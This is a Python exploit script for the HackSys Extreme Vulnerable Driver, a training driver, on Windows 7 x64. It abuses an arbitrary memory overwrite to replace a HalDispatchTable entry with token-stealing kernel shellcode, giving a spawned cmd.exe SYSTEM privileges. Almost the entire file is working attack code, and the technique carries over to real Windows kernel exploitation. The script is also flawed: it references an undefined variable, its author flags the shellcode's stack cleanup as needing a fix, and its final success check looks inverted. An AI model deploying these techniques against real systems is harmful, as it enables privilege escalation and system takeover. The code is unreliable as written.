#Written By: Jb05s
#Purpose: HEVD - Arbitrary Memory Overwrite -- Windows 7 SP1 x64
#Version: v0.1

import sys, struct, time
from ctypes import *
from ctypes.wintypes import *

#Windows API Shorthands
CreateProcessA = windll.kernel32.CreateProcessA
CreateFileA = windll.kernel32.CreateFileA
CloseHandle = windll.kernel32.CloseHandle
VirtualAlloc = windll.kernel32.VirtualAlloc
RtlMoveMemory = windll.kernel32.RtlMoveMemory
DeviceIoControl = windll.kernel32.DeviceIoControl
EnumDeviceDrivers = windll.psapi.EnumDeviceDrivers
GetDeviceDriverBaseNameA = windll.psapi.GetDeviceDriverBaseNameA
LoadLibraryExA = windll.kernel32.LoadLibraryExA
GetProcAddress = windll.kernel32.GetProcAddress
NtQueryIntervalProfile = windll.ntdll.NtQueryIntervalProfile
OutputDebugStringA = windll.kernel32.OutputDebugStringA

#STARTUPINFO/PROCESS_INFORMATION Structures Globals
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

#CreateProcessA() Globals
CREATE_NEW_CONSOLE = 0x10
CMD = "C:\\Windows\\System32\\cmd.exe"

#CreateFileA() Globals
DEVICE = "\\\\.\\HackSysExtremeVulnerableDriver"
GENERIC_READ_WRITE = 0xC0000000
OPEN_EXISTING = 0x3
FILE_ATTRIBUTE_NORMAL = 0x80

#VirtualAlloc() Globals
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

#DeviceIoControl() Globals
IOCTL = 0x22200B

class STARTUPINFO(Structure):
    #STARTUPINFO Structure for CreateProcessA()
    _fields_ = [("cb", DWORD),
                    ("lpReserved", LPTSTR),
                    ("lpDesktop", LPTSTR),
                    ("lpTitle", LPTSTR),
                    ("dwX", DWORD),
                    ("dwY", DWORD),
                    ("dwXSize", DWORD),
                    ("dwYSize", DWORD),
                    ("dwXCountChars", DWORD),
                    ("dwYCountChars", DWORD),
                    ("dwFillAttribute", DWORD),
                    ("dwFlags", DWORD),
                    ("wShowWindow", WORD),
                    ("cbReserved2", WORD),
                    ("lpReserved2", LPBYTE),
                    ("hStdInput", HANDLE),
                    ("hStdOutput", HANDLE),
                    ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):
    #PROCESS_INFORMATION Structure for CreateProcessA()
    _fields_ = [("hProcess", HANDLE),
                    ("hThread", HANDLE),
                    ("dwProcessId", DWORD),
                    ("dwThreadId", DWORD)]

class WriteWhatWhere(Structure):
    _fields_ = [("What", c_void_p),
                    ("Where", c_void_p)
    ]

def debug_print(message):
    print(message)

    OutputDebugStringA(message + "\n")

def getprocess():
    #Declare CreateProcessA() Variables
    lpApplicationName = CMD
    lpCommandLine = CMD
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = 0
    dwCreationFlags = CREATE_NEW_CONSOLE
    lpEnvironment = None
    lpCurrentDirectory = None

    #Setup Structure References
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()

    spawn = CreateProcessA(lpApplicationName,
                                lpCommandLine,
                                lpProcessAttributes,
                                lpThreadAttributes,
                                bInheritHandles,
                                dwCreationFlags,
                                lpEnvironment,
                                lpCurrentDirectory,
                                byref(lpStartupInfo),
                                byref(lpProcessInformation))

    if not spawn:
        debug_print("\t[-] Error - Unable to spawn new process: " + FormatError())
        sys.exit(-1)

    #Delay - Ensure CMD is Fully Spawned Before Executing Token-Stealing Shellcode
    time.sleep(1)

    debug_print("[+] Spawning new process with the following PID: %d" % lpProcessInformation.dwProcessId)
    return lpProcessInformation.dwProcessId

def gethandle():
    #Declare CreateFileA() Variables
    lpFileName = DEVICE
    dwDesiredAccess = GENERIC_READ_WRITE
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFileA(lpFileName, 
                            dwDesiredAccess,
                            dwShareMode,
                            lpSecurityAttributes,
                            dwCreationDisposition,
                            dwFlagsAndAttributes,
                            hTemplateFile)

    if not handle or handle == -1:
        debug_print("\t[-] Error - Unable to get device handle: " + FormatError())
        sys.exit(-1)

    debug_print("[+] Got device handle: 0x%x" % handle)
    return handle

def closehandle(handle):
    return CloseHandle(handle)

def gethal():
    #Declare EnumDeviceDrivers() Variables
    enum_base = (c_ulonglong * 1024)()
    lpImageBase = byref(enum_base)
    cb = c_int(1024)
    lpcbNeeded = byref(c_ulonglong())

    enumHal = EnumDeviceDrivers(lpImageBase,
                                    cb,
                                    lpcbNeeded)

    if not enumHal:
        debug_print("\t[-] Error - Unable to enumerate drivers: " + FormatError())
        sys.exit(-1)

    for base_address in enum_base:
        if not base_address:
            continue
        base_name = c_char_p("\x00" * 1024)

        GetDeviceDriverBaseNameA.argtypes = [c_ulonglong, POINTER(c_char), c_uint32]
        drivers = GetDeviceDriverBaseNameA(base_address, base_name, 48)

        if not drivers:
            debug_print("\t[-] Error - Unable to get driver base names: " + FormatError())
            sys.exit(-1)

        if base_name.value.lower() == "krnl" or "krnl" in base_name.value.lower():
            base_name = base_name.value
            debug_print("[+] Loaded kernel: {0}".format(base_name))
            debug_print("[+] Base address of the loaded kernel: {0}".format(hex(base_address)))
            break

    #Declare LoadLibraryExA() Variables
    lpLibFileName = base_name
    hFile = None
    dwFlags = 0x1

    LoadLibraryExA.restype = c_uint64
    kernel = LoadLibraryExA(lpLibFileName,
                                hFile,
                                dwFlags)

    if not kernel:
        debug_print("\t[-] Error - Unable to get kernel handle: " + FormatError())
        sys.exit(-1)

    #Declare GetProcAddress() Variables
    hModule = kernel
    lpProcName = "HalDispatchTable"

    GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
    GetProcAddress.restype = c_uint64
    hal_address = GetProcAddress(hModule,
                                    lpProcName)

    hal_address -= kernel
    hal_address += base_address
    hal8 = hal_address + 0x8

    debug_print("[+] HalDispatchTable address: {0}".format(hex(hal_address)))
    debug_print("[+] HalDispatchTable + 0x8 address: {0}".format(hex(hal8)))
    return hal8

def tokensteal(pid):
    #Craft Token-Stealing Shellcode
    tokenstealing = ""
    tokenstealing += bytearray(
                                              # start:
    "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"    #    mov rdx, [gs:188h]   ;KTHREAD pointer
    "\x4C\x8B\x42\x70"                        #    mov r8, [rdx+70h]    ;EPROCESS pointer
    "\x4D\x8B\x88\x88\x01\x00\x00"            #    mov r9, [r8+188h]    ;ActiveProcessLinks list head
    "\x49\x8B\x09"                            #    mov rcx, [r9]        ;follow link to first process in list
                                              # find_system:
    "\x48\x8B\x51\xF8"                        #    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
    "\x48\x83\xFA\x04"                        #    cmp rdx, 4           ;UniqueProcessId == 4? 
    "\x74\x05"                                #    jz found_system      ;YES - move on
    "\x48\x8B\x09"                            #    mov rcx, [rcx]       ;NO - load next entry in list
    "\xEB\xF1"                                #    jmp find_system      ;loop
                                              # found_system:
    "\x48\x8B\x81\x80\x00\x00\x00"            #    mov rax, [rcx+80h]   ;offset to token
    "\x24\xF0"                                #    and al, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
                                              # find_cmd:
    "\x48\x8B\x51\xF8"                        #    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
    "\x48\x81\xFA" + struct.pack("<I",pid) +  #    cmp rdx, ZZZZ        ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
    "\x74\x05"                                #    jz found_cmd         ;YES - move on
    "\x48\x8B\x09"                            #    mov rcx, [rcx]       ;NO - next entry in list
    "\xEB\xEE"                                #    jmp find_cmd         ;loop
                                              # found_cmd:
    "\x48\x89\x81\x80\x00\x00\x00"            #    mov [rcx+80h], rax   ;copy SYSTEM token over top of this process's token
                                              # return:
    "\x48\x83\xC4\x20"                        #    add rsp, 20h         ; <------ NEED TO FIX THIS!!
    "\xC3")                                   #    ret)

    debug_print("[+] Allocating buffer for tokenstealing shellcode..")

    #Declare Variables
    lpAddress = c_int(0)
    dwSize = c_int(len(tokenstealing))
    flAllocationType = c_int((MEM_COMMIT | MEM_RESERVE))
    flProtect = c_int(PAGE_EXECUTE_READWRITE)

    alloc = VirtualAlloc(lpAddress,
                            dwSize,
                            flAllocationType,
                            flProtect)

    if not alloc:
        debug_print("\t[-] Error - Unable to allocate tokenstealing shellcode: " + FormatError())
        sys.exit(-1)

    debug_print("[+] Tokenstealing shellcode has been allocated at: 0x%x" % alloc)

    #Move Token-Stealing Shellcode into Allocated Space
    buff = (c_char * len(tokenstealing)).from_buffer(tokenstealing)

    RtlMoveMemory(c_int(alloc), buff, c_int(len(tokenstealing)))

    tkn_addr = id(tokenstealing) + 32
    tkn_final = struct.pack("<Q", alloc)
    tkn_final_addr = id(final) + 32

    debug_print("[+] Address of ring0 tokenstealing shellcode: {0}".format(hex(tkn_addr)))
    debug_print("[+] Pointer to ring0 tokenstealing shellcode: {0}".format(hex(tkn_final_addr)))

    return tkn_final_addr

def trigger(hDevice, hal, sc):
    #Declare WriteWhatWhere Variables
    www = WriteWhatWhere()
    www.What = sc
    www.Where = hal
    www_pointer = pointer(www)

    debug_print("[+] What: {0}".format(hex(www.What)))
    debug_print("[+] Where: {0}".format(hex(www.Where)))

    #Declare DeviceIoControl() Variables
    dwIoControlCode = IOCTL
    lpInBuffer = www_pointer
    nInBufferSize = 0x10
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None

    ownit = DeviceIoControl(hDevice,
                                dwIoControlCode,
                                lpInBuffer,
                                nInBufferSize,
                                lpOutBuffer,
                                nOutBufferSize,
                                lpBytesReturned,
                                lpOverlapped)

    if not ownit:
        debug_print("\t[-] Error - Exploit failed: " + FormatError())
        sys.exit(-1)

    if not closehandle(hDevice):
        debug_print("\t[-] Error - Unable to close the device handle." + FormatError())

    #Declare NtQueryIntervalProfile() Variables
    ProfileSource = 2
    Interval = byref(c_ulong())

    goal = NtQueryIntervalProfile(ProfileSource,
                                    Interval)

    if not goal:
        debug_print("\t[-] Error - NtQueryIntervalProfile not found: " + FormatError())
        sys.exit(-1)

    debug_print("\n[!!] Check for NT AUTHORITY\\SYSTEM privileges!")

if __name__ == "__main__":
    debug_print("**** HackSys Extreme Vulnerable Driver ****")
    debug_print("**** Arbitrary Memory Overwrite Exploit ****")

    pid = getprocess()
    trigger(gethandle(), gethal(), tokensteal(pid))
